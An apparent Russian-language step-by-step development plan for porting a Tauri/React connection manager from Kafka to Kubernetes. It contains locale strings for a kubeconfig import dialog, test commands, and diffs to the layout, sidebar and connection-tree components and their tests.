      "target": "Папка для новых подключений",
      "auth": {
        "token": "токен",
        "clientCert": "клиентский сертификат",
        "browser": "вход через браузер",
        "exec": "exec-плагин"
      },
      "apply_one": "Импортировать {{count}} контекст",
      "apply_few": "Импортировать {{count}} контекста",
      "apply_many": "Импортировать {{count}} контекстов",
      "apply_other": "Импортировать {{count}} контекста",
      "imported_one": "Импортировано {{count}} подключение",
      "imported_few": "Импортировано {{count}} подключения",
      "imported_many": "Импортировано {{count}} подключений",
      "imported_other": "Импортировано {{count}} подключения"
    },
    "hints": {
      "kubeconfig": {
        "target": "Новые подключения попадут в эту папку; уже существующие сохранят своё место, имя, окружение и цвет."
      }
    }
  }
}
````

Применить: `python3 /tmp/o1a-blocks.py step 17.3`.

- [ ] **Step 4: Проверки.**

Run: `pnpm test`  
Expected: PASS — `Test Files 24 passed`, `Tests 113 passed`

Run: `pnpm exec tsc --noEmit`  
Expected: PASS — без ошибок

Run: `pnpm i18n:check`  
Expected: PASS — `✓ словари en, ru согласованы, вызовов из Rust: 126`

- [ ] **Step 5: Commit.**

```bash
git add -A
git commit -s -m "feat(ui): диалог импорта контекстов kubeconfig с подтверждением строки запуска exec-плагина" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 18: Дерево подключений, раскладка, боковая панель, меню Help

**Files:**
- Port: `src/components/Layout.test.tsx` (с правками), `src/components/Layout.tsx` (с правками), `src/components/Sidebar.tsx` (с правками), `src/components/TabContent.help.test.tsx`, `src/components/connections/tree/ConnectionTree.test.tsx` (с правками), `src/components/connections/tree/ConnectionTree.tsx` (с правками), `src/components/connections/tree/FolderMenu.tsx`, `src/components/connections/tree/ImportDialog.test.tsx` (с правками), `src/components/connections/tree/ImportDialog.tsx` (с правками), `src/guide/noLookbehind.test.ts` (с правками), `src/lib/useAppMenu.test.ts` (с правками), `src/lib/useAppMenu.ts` (с правками), `src/lib/useHelpShortcut.ts`
- Create: `src/components/Sidebar.test.tsx`, `src/components/TabContent.tsx`, `src/components/connections/tree/ConnectionNode.tsx`
- Modify: `PORTED.md`, `src/App.test.tsx`, `src/App.tsx`, `src/locales/en.json`, `src/locales/ru.json`

**Interfaces:**
- Consumes: задачи 13–17.
- Produces: `Layout`, `Sidebar`, `TabContent({ tab })`, `ConnectionTree`, `ConnectionNode({ connection, rowProps })`, `useHelpShortcut`, `useAppMenu`.

Переносятся дерево с папками, перетаскиванием, фильтром, экспортом и импортом (`ConnectionTree`, `FolderMenu`, `ImportDialog`), раскладка с вкладками и полосой окружения, боковая панель, F1 и меню Help macOS (без пунктов «Решение проблем» и «Собрать диагностику…» — они в O6). В меню «⋯» заголовка и папки — «Импорт из kubeconfig…» / «… сюда…». Узел подключения в O1a — один пункт «Обзор»; этап O1b добавит «Проекты» и «Ноды». После задачи приложение запускается: `pnpm tauri dev`.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t18-port step=18.1 -->
````bash
scripts/port.sh src/components/Layout.test.tsx src/components/Layout.test.tsx
scripts/port.sh src/components/Layout.tsx src/components/Layout.tsx
scripts/port.sh src/components/Sidebar.tsx src/components/Sidebar.tsx
scripts/port.sh src/components/TabContent.help.test.tsx src/components/TabContent.help.test.tsx
scripts/port.sh src/components/connections/tree/ConnectionTree.test.tsx src/components/connections/tree/ConnectionTree.test.tsx
scripts/port.sh src/components/connections/tree/ConnectionTree.tsx src/components/connections/tree/ConnectionTree.tsx
scripts/port.sh src/components/connections/tree/FolderMenu.tsx src/components/connections/tree/FolderMenu.tsx
scripts/port.sh src/components/connections/tree/ImportDialog.test.tsx src/components/connections/tree/ImportDialog.test.tsx
scripts/port.sh src/components/connections/tree/ImportDialog.tsx src/components/connections/tree/ImportDialog.tsx
scripts/port.sh src/guide/noLookbehind.test.ts src/guide/noLookbehind.test.ts
scripts/port.sh src/lib/useAppMenu.test.ts src/lib/useAppMenu.test.ts
scripts/port.sh src/lib/useAppMenu.ts src/lib/useAppMenu.ts
scripts/port.sh src/lib/useHelpShortcut.ts src/lib/useHelpShortcut.ts
````

<!-- block: patch t18-port-src-components-layout-test-tsx step=18.1 -->
````diff
diff --git a/src/components/Layout.test.tsx b/src/components/Layout.test.tsx
--- a/src/components/Layout.test.tsx
+++ b/src/components/Layout.test.tsx
@@ -14,10 +14,14 @@ vi.mock("../api/client", async (importOriginal) => {
     color: "#888",
     environment: "prod",
     readOnly: true,
-    bootstrapServers: "localhost:9092",
-    security: { type: "plaintext" },
-    extraProperties: {},
+    apiUrl: "https://api.prod:6443",
+    auth: { method: "browser" },
+    ca: { mode: "system" },
+    proxy: { mode: "system" },
+    favoriteNamespaces: [],
+    manualNamespaces: [],
     requestTimeoutMs: 5000,
+    connectTimeoutMs: 5000,
   } as unknown as ConnectionProfile;
   return { ...actual, api: { ...actual.api, listConnections: vi.fn().mockResolvedValue([conn]), listFolders: vi.fn().mockResolvedValue([]) } };
 });
@@ -31,10 +35,10 @@ describe("Layout tabs", () => {
     useHelpContext.setState({ byTab: {} });
     useWorkspace.setState({
       tabs: [
-        { kind: "topics", connectionId: "c1", id: "topics:c1" },
         { kind: "cluster", connectionId: "c1", id: "cluster:c1" },
+        { kind: "connection-form", connectionId: "c1", id: "connection-form:c1" },
       ],
-      activeId: "topics:c1",
+      activeId: "cluster:c1",
     });
   });
 
@@ -58,8 +62,8 @@ describe("Layout tabs", () => {
 
   it("F1 opens the guide chapter of the active screen", () => {
     useWorkspace.setState({
-      tabs: [{ kind: "producer", connectionId: "c1", id: "producer:c1" }],
-      activeId: "producer:c1",
+      tabs: [{ kind: "connection-form", connectionId: "c1", id: "connection-form:c1" }],
+      activeId: "connection-form:c1",
     });
     renderWithClient(<Layout />);
     const ev = new KeyboardEvent("keydown", { key: "F1", bubbles: true, cancelable: true });
@@ -69,19 +73,19 @@ describe("Layout tabs", () => {
     expect(ev.defaultPrevented).toBe(true);
     const { tabs, activeId } = useWorkspace.getState();
     expect(activeId).toBe("help");
-    expect(tabs.find((t) => t.id === "help")).toMatchObject({ kind: "help", chapter: "producer" });
+    expect(tabs.find((t) => t.id === "help")).toMatchObject({ kind: "help", chapter: "connections" });
     expect(within(screen.getByRole("tablist")).getByRole("tab", { name: "Справка" })).toBeInTheDocument();
   });
 
   it("F1 prefers the chapter the active screen reports", () => {
     useWorkspace.setState({
-      tabs: [{ kind: "topic", connectionId: "c1", topic: "orders", id: "topic:c1:orders" }],
-      activeId: "topic:c1:orders",
+      tabs: [{ kind: "settings", id: "settings" }],
+      activeId: "settings",
     });
-    useHelpContext.setState({ byTab: { "topic:c1:orders": "browse" } });
+    useHelpContext.setState({ byTab: { settings: "connections" } });
     renderWithClient(<Layout />);
     fireEvent.keyDown(window, { key: "F1" });
-    expect(useWorkspace.getState().tabs.find((t) => t.id === "help")).toMatchObject({ chapter: "browse" });
+    expect(useWorkspace.getState().tabs.find((t) => t.id === "help")).toMatchObject({ chapter: "connections" });
   });
 
   it("opens the guide from the sidebar", () => {
````

<!-- block: patch t18-port-src-components-layout-tsx step=18.1 -->
````diff
diff --git a/src/components/Layout.tsx b/src/components/Layout.tsx
--- a/src/components/Layout.tsx
+++ b/src/components/Layout.tsx
@@ -5,14 +5,10 @@ import type { ConnectionProfile } from "../api/types";
 import { ENV_COLORS } from "../lib/env";
 import { type Tab, useWorkspace } from "../state/workspace";
 import { EnvBadge } from "./common/EnvBadge";
-import { UpdateNotice } from "./about/UpdateNotice";
 import { Sidebar } from "./Sidebar";
 import { i18n } from "../i18n";
 import { TabContent } from "./TabContent";
 import { useHelpShortcut } from "../lib/useHelpShortcut";
-import { useHealthEvents } from "../lib/useHealth";
-import { useMcpEvents } from "../lib/useMcpStatus";
-import { ApprovalDialog } from "./mcp/ApprovalDialog";
 
 function tabTitle(tab: Tab, byId: Map<string, ConnectionProfile>): string {
   const connId = "connectionId" in tab ? tab.connectionId : null;
@@ -28,20 +24,6 @@ function tabTitle(tab: Tab, byId: Map<string, ConnectionProfile>): string {
       return tab.connectionId ? i18n.t("tabs.connection", { name: conn }) : i18n.t("tabs.newConnection");
     case "cluster":
       return i18n.t("tabs.cluster", { conn });
-    case "topics":
-      return i18n.t("tabs.topics", { conn });
-    case "topic":
-      return `${conn} · ${tab.topic}`;
-    case "groups":
-      return i18n.t("tabs.groups", { conn });
-    case "findings":
-      return i18n.t("tabs.findings", { conn });
-    case "group":
-      return `${conn} · ${tab.groupId}`;
-    case "producer":
-      return i18n.t("tabs.producer", { conn });
-    case "consumer":
-      return i18n.t("tabs.consumer", { conn, target: tab.groupId ?? tab.topic ?? "" }).trim();
   }
 }
 
@@ -49,8 +31,6 @@ export function Layout() {
   const { t } = useTranslation(); // заодно перерисовывает заголовки вкладок при смене языка
   const { tabs, activeId, activate, close } = useWorkspace();
   useHelpShortcut();
-  useMcpEvents();
-  useHealthEvents();
   const { data: connections = [] } = useQuery({ queryKey: ["connections"], queryFn: api.listConnections });
   const byId = new Map(connections.map((c) => [c.id, c]));
   const active = tabs.find((x) => x.id === activeId);
@@ -62,7 +42,6 @@ export function Layout() {
       <Sidebar />
       <main className="workspace">
         <div className="env-stripe" style={{ background: activeConn ? ENV_COLORS[activeConn.environment] : "transparent" }} />
-        <UpdateNotice />
         <nav className="tabbar" role="tablist">
           {tabs.map((tab) => {
             const tConnId = "connectionId" in tab ? tab.connectionId : null;
@@ -97,7 +76,6 @@ export function Layout() {
           </section>
         ))}
       </main>
-      <ApprovalDialog />
     </div>
   );
 }
````

<!-- block: patch t18-port-src-components-sidebar-tsx step=18.1 -->
````diff
diff --git a/src/components/Sidebar.tsx b/src/components/Sidebar.tsx
--- a/src/components/Sidebar.tsx
+++ b/src/components/Sidebar.tsx
@@ -2,7 +2,6 @@ import { useTranslation } from "react-i18next";
 import { useWorkspace } from "../state/workspace";
 import { openSupport } from "../lib/links";
 import { ConnectionTree } from "./connections/tree/ConnectionTree";
-import { McpIndicator } from "./mcp/McpIndicator";
 
 export function Sidebar() {
   const { t } = useTranslation();
@@ -12,7 +11,6 @@ export function Sidebar() {
     <aside className="sidebar">
       <ConnectionTree />
       <div className="sidebar-footer">
-        <McpIndicator />
         <button type="button" className="link" onClick={() => open({ kind: "settings" })}>
           {t("sidebar.settings")}
         </button>
````

<!-- block: patch t18-port-src-components-connections-tree-connectiontree-test-tsx step=18.1 -->
````diff
diff --git a/src/components/connections/tree/ConnectionTree.test.tsx b/src/components/connections/tree/ConnectionTree.test.tsx
--- a/src/components/connections/tree/ConnectionTree.test.tsx
+++ b/src/components/connections/tree/ConnectionTree.test.tsx
@@ -20,6 +20,8 @@ vi.mock("../../../api/client", async (importOriginal) => {
       exportConnections: vi.fn(),
       previewImport: vi.fn(),
       applyImport: vi.fn(),
+      previewKubeconfigImport: vi.fn(),
+      applyKubeconfigImport: vi.fn(),
     },
   };
 });
@@ -35,7 +37,7 @@ const FOLDERS: ConnectionFolder[] = [
   { id: "b", name: "ИФТ", parentId: "a", order: 0 },
 ];
 const CONNS: ConnectionProfile[] = [
-  { ...newProfile(), id: "x", name: "kafka-ift", folderId: "b", order: 0 },
+  { ...newProfile(), id: "x", name: "ocp-ift", folderId: "b", order: 0 },
   { ...newProfile(), id: "y", name: "local", folderId: null, order: 0 },
 ];
 
@@ -79,33 +81,35 @@ async function openFolderMenu(name: string) {
 describe("ConnectionTree", () => {
   it("показывает папки с подключениями и пункты подключения", async () => {
     renderWithClient(<ConnectionTree />);
-    expect(await screen.findByText("kafka-ift")).toBeInTheDocument();
+    expect(await screen.findByText("ocp-ift")).toBeInTheDocument();
     expect(screen.getByRole("button", { name: "Развернуть или свернуть Проект А" })).toHaveAttribute("aria-expanded", "true");
     expect(screen.getByRole("button", { name: "Развернуть или свернуть ИФТ" })).toBeInTheDocument();
     expect(screen.getByText("local")).toBeInTheDocument();
-    expect(screen.getAllByRole("button", { name: "Топики" })).toHaveLength(2);
+    expect(screen.getAllByRole("button", { name: "Обзор" })).toHaveLength(2);
   });
 
-  it("кнопка «Consumer-сессия» подключения доступна без ключа", async () => {
+  it("«Обзор» открывает вкладку подключения", async () => {
     vi.mocked(api.listConnections).mockResolvedValue([CONNS[1]]);
+    const user = userEvent.setup();
     renderWithClient(<ConnectionTree />);
     await screen.findByText("local");
-    expect(screen.getByRole("button", { name: /Consumer-сессия/ })).toBeEnabled();
+    await user.click(screen.getByRole("button", { name: "Обзор" }));
+    expect(useWorkspace.getState().activeId).toBe("cluster:y");
   });
 
   it("сворачивание папки сохраняется между перерисовками", async () => {
     const user = userEvent.setup();
     const first = renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     await user.click(screen.getByRole("button", { name: "Развернуть или свернуть Проект А" }));
-    expect(screen.queryByText("kafka-ift")).not.toBeInTheDocument();
+    expect(screen.queryByText("ocp-ift")).not.toBeInTheDocument();
     expect(screen.getByRole("button", { name: "Развернуть или свернуть Проект А" })).toHaveAttribute("aria-expanded", "false");
     expect(JSON.parse(localStorage.getItem("glafira.tree.collapsed") ?? "[]")).toEqual(["a"]);
     first.unmount();
 
     renderWithClient(<ConnectionTree />);
     expect(await screen.findByText("local")).toBeInTheDocument();
-    expect(screen.queryByText("kafka-ift")).not.toBeInTheDocument();
+    expect(screen.queryByText("ocp-ift")).not.toBeInTheDocument();
   });
 
   it("сворачивание пишет localStorage один раз (без побочных эффектов в updater)", async () => {
@@ -115,7 +119,7 @@ describe("ConnectionTree", () => {
         <ConnectionTree />
       </StrictMode>,
     );
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const setItem = vi.spyOn(Storage.prototype, "setItem");
     await user.click(screen.getByRole("button", { name: "Развернуть или свернуть Проект А" }));
     expect(setItem.mock.calls.filter(([k]) => k === "glafira.tree.collapsed")).toEqual([["glafira.tree.collapsed", '["a"]']]);
@@ -136,7 +140,7 @@ describe("ConnectionTree", () => {
 
   it("строка папки с открытым меню не перетаскивается", async () => {
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     expect(folderRow("Проект А")).toHaveAttribute("draggable", "true");
     await openFolderMenu("Проект А");
     expect(folderRow("Проект А")).toHaveAttribute("draggable", "false");
@@ -146,7 +150,7 @@ describe("ConnectionTree", () => {
   it("испорченное значение в localStorage не ломает дерево", async () => {
     localStorage.setItem("glafira.tree.collapsed", "{not json");
     renderWithClient(<ConnectionTree />);
-    expect(await screen.findByText("kafka-ift")).toBeInTheDocument();
+    expect(await screen.findByText("ocp-ift")).toBeInTheDocument();
   });
 
   it("фильтр скрывает несовпавшие, разворачивает папки и сообщает, если ничего нет", async () => {
@@ -154,28 +158,28 @@ describe("ConnectionTree", () => {
     const user = userEvent.setup();
     renderWithClient(<ConnectionTree />);
     await screen.findByText("local");
-    expect(screen.queryByText("kafka-ift")).not.toBeInTheDocument();
+    expect(screen.queryByText("ocp-ift")).not.toBeInTheDocument();
 
     const filter = screen.getByRole("searchbox", { name: "Фильтр подключений" });
     await user.type(filter, "ift");
-    expect(screen.getByText("kafka-ift")).toBeInTheDocument();
+    expect(screen.getByText("ocp-ift")).toBeInTheDocument();
     expect(screen.queryByText("local")).not.toBeInTheDocument();
     expect(screen.queryByText("Ничего не найдено")).not.toBeInTheDocument();
 
     await user.clear(filter);
     await user.type(filter, "zzz");
     expect(screen.getByText("Ничего не найдено")).toBeInTheDocument();
-    expect(screen.queryByText("kafka-ift")).not.toBeInTheDocument();
+    expect(screen.queryByText("ocp-ift")).not.toBeInTheDocument();
 
     await user.clear(filter);
     expect(screen.getByText("local")).toBeInTheDocument();
-    expect(screen.queryByText("kafka-ift")).not.toBeInTheDocument();
+    expect(screen.queryByText("ocp-ift")).not.toBeInTheDocument();
   });
 
   it("подключения видны, даже если папки не загрузились", async () => {
     vi.mocked(api.listFolders).mockRejectedValue(new Error("boom"));
     renderWithClient(<ConnectionTree />);
-    expect(await screen.findByText("kafka-ift")).toBeInTheDocument();
+    expect(await screen.findByText("ocp-ift")).toBeInTheDocument();
     expect(screen.getByText("local")).toBeInTheDocument();
   });
 
@@ -212,7 +216,7 @@ describe("ConnectionTree", () => {
       retryable: false,
     });
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const { user } = await openFolderMenu("Проект А");
     await user.click(screen.getByRole("menuitem", { name: "Новая папка" }));
     const input = screen.getByRole("textbox", { name: "Имя папки" });
@@ -225,7 +229,7 @@ describe("ConnectionTree", () => {
   it("меню папки открывается правым кликом и закрывается по Esc", async () => {
     const user = userEvent.setup();
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     fireEvent.contextMenu(folderRow("ИФТ"));
     const menu = screen.getByRole("menu");
     expect(within(menu).getAllByRole("menuitem").map((m) => m.textContent)).toEqual([
@@ -235,6 +239,7 @@ describe("ConnectionTree", () => {
       "Удалить",
       "Экспортировать папку…",
       "Импортировать сюда…",
+      "Импорт из kubeconfig сюда…",
     ]);
     await user.keyboard("{Escape}");
     expect(screen.queryByRole("menu")).not.toBeInTheDocument();
@@ -243,7 +248,7 @@ describe("ConnectionTree", () => {
   it("меню закрывается кликом вне его", async () => {
     const user = userEvent.setup();
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     await openFolderMenu("ИФТ");
     await user.click(screen.getByText("local"));
     expect(screen.queryByRole("menu")).not.toBeInTheDocument();
@@ -252,7 +257,7 @@ describe("ConnectionTree", () => {
   it("переименование через меню", async () => {
     vi.mocked(api.renameFolder).mockResolvedValue({ id: "a", name: "Проект Б", parentId: null, order: 0 });
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const { user } = await openFolderMenu("Проект А");
     await user.click(screen.getByRole("menuitem", { name: "Переименовать" }));
     const input = screen.getByRole("textbox", { name: "Имя папки" });
@@ -270,7 +275,7 @@ describe("ConnectionTree", () => {
       retryable: false,
     });
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const { user } = await openFolderMenu("Проект А");
     await user.click(screen.getByRole("menuitem", { name: "Удалить" }));
     expect(api.deleteFolder).not.toHaveBeenCalled();
@@ -286,7 +291,7 @@ describe("ConnectionTree", () => {
   it("удаление пустой папки", async () => {
     vi.mocked(api.deleteFolder).mockResolvedValue(undefined);
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const { user } = await openFolderMenu("ИФТ");
     await user.click(screen.getByRole("menuitem", { name: "Удалить" }));
     await user.click(within(screen.getByRole("group", { name: "Удалить папку «ИФТ»?" })).getByRole("button", { name: "Удалить" }));
@@ -296,7 +301,7 @@ describe("ConnectionTree", () => {
 
   it("«Новое подключение здесь» открывает форму с папкой", async () => {
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const { user } = await openFolderMenu("ИФТ");
     await user.click(screen.getByRole("menuitem", { name: "Новое подключение здесь" }));
     expect(useWorkspace.getState().tabs).toEqual([
@@ -308,7 +313,7 @@ describe("ConnectionTree", () => {
   it("перетаскивание подключения на папку переносит его внутрь", async () => {
     vi.mocked(api.moveItems).mockResolvedValue(undefined);
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const dataTransfer = stubDataTransfer();
     fireEvent.dragStart(connRow("local"), { dataTransfer });
     const notPrevented = fireEvent.dragOver(folderRow("ИФТ"), { dataTransfer });
@@ -321,17 +326,17 @@ describe("ConnectionTree", () => {
   it("перетаскивание на подключение ставит перед ним в его папку", async () => {
     vi.mocked(api.moveItems).mockResolvedValue(undefined);
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const dataTransfer = stubDataTransfer();
     fireEvent.dragStart(connRow("local"), { dataTransfer });
-    fireEvent.dragOver(connRow("kafka-ift"), { dataTransfer });
-    fireEvent.drop(connRow("kafka-ift"), { dataTransfer });
+    fireEvent.dragOver(connRow("ocp-ift"), { dataTransfer });
+    fireEvent.drop(connRow("ocp-ift"), { dataTransfer });
     expect(api.moveItems).toHaveBeenCalledWith([{ kind: "connection", id: "y" }], "b", { kind: "connection", id: "x" });
   });
 
   it("папку нельзя бросить в её потомка", async () => {
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const dataTransfer = stubDataTransfer();
     fireEvent.dragStart(folderRow("Проект А"), { dataTransfer });
     const notPrevented = fireEvent.dragOver(folderRow("ИФТ"), { dataTransfer });
@@ -344,7 +349,7 @@ describe("ConnectionTree", () => {
   it("перетаскивание на заголовок панели переносит в корень", async () => {
     vi.mocked(api.moveItems).mockResolvedValue(undefined);
     renderWithClient(<ConnectionTree />);
-    await screen.findByText("kafka-ift");
+    await screen.findByText("ocp-ift");
     const dataTransfer = stubDataTransfer();
     const header = screen.getByText("Подключения").closest(".sidebar-header") as HTMLElement;
     fireEvent.dragStart(folderRow("ИФТ"), { dataTransfer });
@@ -439,7 +444,7 @@ describe("ConnectionTree", () => {
     it("триггер: aria-haspopup и aria-expanded; Esc возвращает фокус и не уходит в document", async () => {
       const user = userEvent.setup();
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       const trigger = within(folderRow("ИФТ")).getByRole("button", { name: "Ещё действия" });
       expect(trigger).toHaveAttribute("aria-haspopup", "menu");
       expect(trigger).toHaveAttribute("aria-expanded", "false");
@@ -462,7 +467,7 @@ describe("ConnectionTree", () => {
     it("Tab закрывает меню", async () => {
       const user = userEvent.setup();
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       const header = screen.getByText("Подключения").closest(".sidebar-header") as HTMLElement;
       await user.click(within(header).getByRole("button", { name: "Ещё действия" }));
       expect(screen.getByRole("menu")).toBeInTheDocument();
@@ -472,7 +477,7 @@ describe("ConnectionTree", () => {
 
     it("перетаскивание не начинается из меню", async () => {
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       await openFolderMenu("ИФТ");
       const dataTransfer = stubDataTransfer();
       const notPrevented = fireEvent.dragStart(screen.getAllByRole("menuitem")[0], { dataTransfer });
@@ -497,7 +502,7 @@ describe("ConnectionTree", () => {
     expect(screen.getByRole("textbox", { name: "Имя папки" })).toHaveValue("x");
   });
   describe("экспорт и импорт", () => {
-    const EMPTY_PREVIEW = { added: [], updated: [], unchanged: [], skipped: [], warnings: [], needsPasswords: 0 };
+    const EMPTY_PREVIEW = { added: [], updated: [], unchanged: [], skipped: [], warnings: [], needsSecrets: 0 };
 
     async function openHeaderMenu() {
       const user = userEvent.setup();
@@ -511,11 +516,11 @@ describe("ConnectionTree", () => {
       vi.mocked(save).mockResolvedValue("/tmp/a.json");
       vi.mocked(api.exportConnections).mockResolvedValue({ connections: 1, folders: 2 });
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       const { user, menu } = await openFolderMenu("Проект А");
       await user.click(within(menu).getByRole("menuitem", { name: "Экспортировать папку…" }));
       expect(save).toHaveBeenCalledWith({
-        defaultPath: "Проект А.glafira-connections.json",
+        defaultPath: "Проект А.glafira-kubernetes-connections.json",
         filters: [{ name: "Glafira", extensions: ["json"] }],
       });
       expect(api.exportConnections).toHaveBeenCalledWith("/tmp/a.json", "a");
@@ -529,14 +534,14 @@ describe("ConnectionTree", () => {
       const { user, menu } = await openHeaderMenu();
       await user.click(within(menu).getByRole("menuitem", { name: "Экспортировать всё…" }));
       const arg = vi.mocked(save).mock.calls[0][0];
-      expect(arg?.defaultPath).toMatch(/^glafira-connections-\d{4}-\d{2}-\d{2}\.glafira-connections\.json$/);
+      expect(arg?.defaultPath).toMatch(/^glafira-kubernetes-connections-\d{4}-\d{2}-\d{2}\.glafira-kubernetes-connections\.json$/);
       expect(api.exportConnections).toHaveBeenCalledWith("/tmp/all.json", null);
     });
 
     it("отмена диалога сохранения ничего не вызывает", async () => {
       vi.mocked(save).mockResolvedValue(null);
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       const { user, menu } = await openFolderMenu("ИФТ");
       await user.click(within(menu).getByRole("menuitem", { name: "Экспортировать папку…" }));
       await waitFor(() => expect(save).toHaveBeenCalled());
@@ -559,10 +564,10 @@ describe("ConnectionTree", () => {
       vi.mocked(api.applyImport).mockResolvedValue({
         ...EMPTY_PREVIEW,
         added: [{ kind: "connection", id: "n", name: "n", path: [] }],
-        needsPasswords: 1,
+        needsSecrets: 1,
       });
       renderWithClient(<ConnectionTree />);
-      await screen.findByText("kafka-ift");
+      await screen.findByText("ocp-ift");
       const { user, menu } = await openFolderMenu("ИФТ");
       await user.click(within(menu).getByRole("menuitem", { name: "Импортировать сюда…" }));
       expect(openDialog).toHaveBeenCalledWith({ multiple: false, directory: false, filters: [{ name: "Glafira", extensions: ["json"] }] });
@@ -573,7 +578,7 @@ describe("ConnectionTree", () => {
       await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
       const status = screen.getByRole("status");
       expect(status).toHaveTextContent("Импортировано: добавлено 1, обновлено 0");
-      expect(status).toHaveTextContent("Введите пароли для 1 подключения");
+      expect(status).toHaveTextContent("Введите токен или ключ для 1 подключения");
     });
 
     it("«Импортировать…» в заголовке: отмена выбора файла не открывает диалог", async () => {
@@ -585,5 +590,25 @@ describe("ConnectionTree", () => {
       expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
       expect(api.previewImport).not.toHaveBeenCalled();
     });
+
+    it("«Импорт из kubeconfig сюда…» открывает диалог с этой папкой и сообщает итог", async () => {
+      vi.mocked(api.previewKubeconfigImport).mockResolvedValue({
+        path: "/home/u/.kube/config",
+        contexts: [
+          { name: "dev", cluster: "c", server: "https://api.dev:6443", user: "u", namespace: null, auth: "token",
+            insecure: false, current: true, exec: null, unsupported: null, existingId: null },
+        ],
+      });
+      vi.mocked(api.applyKubeconfigImport).mockResolvedValue([{ ...newProfile(), id: "k", name: "dev" }]);
+      renderWithClient(<ConnectionTree />);
+      await screen.findByText("ocp-ift");
+      const { user, menu } = await openFolderMenu("ИФТ");
+      await user.click(within(menu).getByRole("menuitem", { name: "Импорт из kubeconfig сюда…" }));
+      const dialog = await screen.findByRole("dialog", { name: "Импорт из kubeconfig" });
+      await user.click(await within(dialog).findByRole("button", { name: "Импортировать 1 контекст" }));
+      expect(api.applyKubeconfigImport).toHaveBeenCalledWith("/home/u/.kube/config", ["dev"], "b", []);
+      await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
+      expect(screen.getByRole("status")).toHaveTextContent("Импортировано 1 подключение");
+    });
   });
 });
````

<!-- block: patch t18-port-src-components-connections-tree-connectiontree-tsx step=18.1 -->
````diff
diff --git a/src/components/connections/tree/ConnectionTree.tsx b/src/components/connections/tree/ConnectionTree.tsx
--- a/src/components/connections/tree/ConnectionTree.tsx
+++ b/src/components/connections/tree/ConnectionTree.tsx
@@ -3,13 +3,14 @@ import { open as openDialog, save } from "@tauri-apps/plugin-dialog";
 import { type DragEvent, type KeyboardEvent, useEffect, useMemo, useRef, useState } from "react";
 import { Trans, useTranslation } from "react-i18next";
 import { api, toAppError } from "../../../api/client";
-import type { AppError, ConnectionFolder, ImportPreview, TreeItemRef } from "../../../api/types";
+import type { AppError, ConnectionFolder, ConnectionProfile, ImportPreview, TreeItemRef } from "../../../api/types";
 import { tr } from "../../../i18n/text";
 import { useWorkspace } from "../../../state/workspace";
 import { ErrorBanner } from "../../common/ErrorBanner";
 import { ConnectionNode } from "./ConnectionNode";
 import { FolderMenu, type FolderMenuItem } from "./FolderMenu";
 import { ImportDialog } from "./ImportDialog";
+import { KubeconfigImportDialog } from "./KubeconfigImportDialog";
 import { buildTree, canMoveFolder, filterTree, type TreeNode } from "./folderTree";
 
 const COLLAPSED_KEY = "glafira.tree.collapsed";
@@ -19,14 +20,14 @@ const DRAG_TYPE = "application/x-glafira-tree-item";
 const BEFORE_ZONE = 0.3;
 /** Фильтр диалогов сохранения и открытия файла экспорта. */
 const EXCHANGE_FILTERS = [{ name: "Glafira", extensions: ["json"] }];
-const EXCHANGE_SUFFIX = ".glafira-connections.json";
+const EXCHANGE_SUFFIX = ".glafira-kubernetes-connections.json";
 
 /** Имя файла экспорта по умолчанию: имя папки (без недопустимых в именах файлов символов) или дата. */
 function exportFileName(folder: ConnectionFolder | null): string {
   if (folder) return `${folder.name.replace(/[\\/:*?"<>|]/g, "_")}${EXCHANGE_SUFFIX}`;
   const d = new Date();
   const pad = (n: number) => String(n).padStart(2, "0");
-  return `glafira-connections-${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}${EXCHANGE_SUFFIX}`;
+  return `glafira-kubernetes-connections-${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())}${EXCHANGE_SUFFIX}`;
 }
 
 function readCollapsed(): Set<string> {
@@ -160,6 +161,8 @@ export function ConnectionTree() {
   const [exchangeError, setExchangeError] = useState<unknown>(null);
   /** Открытый диалог импорта: выбранный файл и начальная цель. */
   const [importing, setImporting] = useState<{ path: string; targetId: string | null } | null>(null);
+  /** Открытый диалог импорта из kubeconfig: папка новых подключений. */
+  const [kubeImport, setKubeImport] = useState<{ targetId: string | null } | null>(null);
